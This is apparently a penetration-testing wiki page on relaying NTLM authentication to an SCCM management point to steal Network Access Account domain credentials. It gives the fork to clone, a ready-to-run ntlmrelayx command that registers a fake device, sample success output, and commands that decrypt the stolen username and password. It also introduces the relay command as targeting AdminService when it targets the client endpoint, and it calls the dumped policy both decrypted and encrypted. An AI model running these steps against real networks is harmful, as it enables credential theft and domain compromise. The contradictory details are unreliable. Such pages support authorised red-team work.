**NTLM relay to SCCM** — SCCM (Microsoft Configuration Manager) is the tool admins use to push software and updates to every machine in the domain, and it accepts NTLM logins on more than one endpoint — so if you coerce a domain machine to authenticate and relay it, which win you get depends on where you relay. Relay to the management point's **client endpoint** (`/ccm_system_windowsauth/request`) and register a fake device, and it hands you the machine/NAA policy — the Network Access Account (NAA) credentials, a set of domain credentials SCCM stores so clients can fetch software, and a handy account for you. Relay to the **AdminService API** instead and that is a *separate* attack: SCCM site takeover, e.g. adding yourself as a Full Administrator — not NAA dumping.

```
attacker -> machine: coerce NTLM authentication
machine -> attacker: NTLM over HTTP
attacker -> SCCM client endpoint (/ccm_system_windowsauth/request): relay, register fake device
SCCM -> attacker: machine/NAA policy (encrypted) -> decrypt
(relay to AdminService API instead -> SCCM site takeover / Full Admin)
```

## Discovery

See the SCCM section of [Tier Zero Server Isolation](../../Reconnaissance/Tier%20Zero%20Server%20Isolation.md).

## Exploitation

### Retrieve NAA credentials

For background on Network Access Accounts, see [SCCM NAA Credentials](../../SCCM%20Attacks/SCCM%20NAA%20Credentials.md).

Prerequisites: a domain user account, and the ability to coerce NTLM authentication from a domain-joined machine.

**Note:** The SCCM relay module is not yet merged into mainline `impacket` - use the fork.

```bash

git clone -b 'feature/sccm-relay' 'https://github.com/Tw1sm/impacket' 'impacket-sccm-relay'

```

Relay a computer account's NTLM authentication to the SCCM AdminService API over HTTP:

```bash

# 1. Recommended: use a virtualenv
virtualenv impacket-sccm-relay
source impacket-sccm-relay/bin/activate
cd impacket-sccm-relay
pip3 install .

# 2. Prepare the relay
python3 ./examples/ntlmrelayx.py -t 'http://SCCM_FQDN/ccm_system_windowsauth/request' --sccm --sccm-device 'FAKE_DEVICE' --sccm-fqdn 'SCCM_FQDN' --sccm-sleep 10 -smb2support

```

**Note:** `--sccm-device 'FAKE_DEVICE'` is arbitrary; it does not need to match a real host name.

Then coerce a domain machine to authenticate back to you (see [Coercing Authentication](../../Coercion/Coercing%20Authentication.md)).

```bash

[*] Authenticating against http://sccm.domain.local as DOMAIN/SERVER1$ SUCCEED
[*] Creating certificate for our fake server...
[*] Registering our fake server...
[*] Requesting NAAPolicy...
[*] Decrypted policy dumped to naapolicy.xml

```

On success, `naapolicy.xml` holds the encrypted `NETWORK_ACCESS_USERNAME` and `NETWORK_ACCESS_PASSWORD`. Decrypt them with `policysecretunobfuscate.py` (from sccmwtf):

```bash

python3 policysecretunobfuscate.py 'NETWORK_ACCESS_USERNAME'
python3 policysecretunobfuscate.py 'NETWORK_ACCESS_PASSWORD'

```

## Caution

**Warning:** Exploitation creates devices named after the attacker's IP in the SCCM database. Note them in the report, or remove the registered device with `SharpSCCM` using a privileged SCCM account.

## References

- impacket (sccm-relay fork) - https://github.com/Tw1sm/impacket/tree/feature/sccm-relay
- sccmwtf - https://github.com/xpn/sccmwtf
- SpecterOps - Site Takeover via SCCM's AdminService API - https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf
- SpecterOps - The Phantom Credentials of SCCM - https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
